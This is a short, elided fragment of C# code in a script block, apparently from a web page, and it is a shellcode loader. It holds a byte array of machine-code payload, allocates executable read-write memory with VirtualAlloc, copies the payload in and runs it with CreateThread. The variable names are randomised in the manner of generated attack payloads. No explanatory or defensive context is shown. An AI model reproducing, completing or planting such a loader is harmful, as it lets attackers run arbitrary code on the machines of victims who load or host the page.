...
0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x50,0x8b,0x48,0x18,0x01,0xd3,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr mNFssD = VirtualAlloc(IntPtr.Zero,(UIntPtr)hFOJEE.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(hFOJEE,0,mNFssD,hFOJEE.Length);
        IntPtr u09nLG5O5 = IntPtr.Zero;
        IntPtr pfnayW = CreateThread(IntPtr.Zero,UIntPtr.Zero,mNFssD,IntPtr.Zero,0,ref u09nLG5O5);
    }
</script>
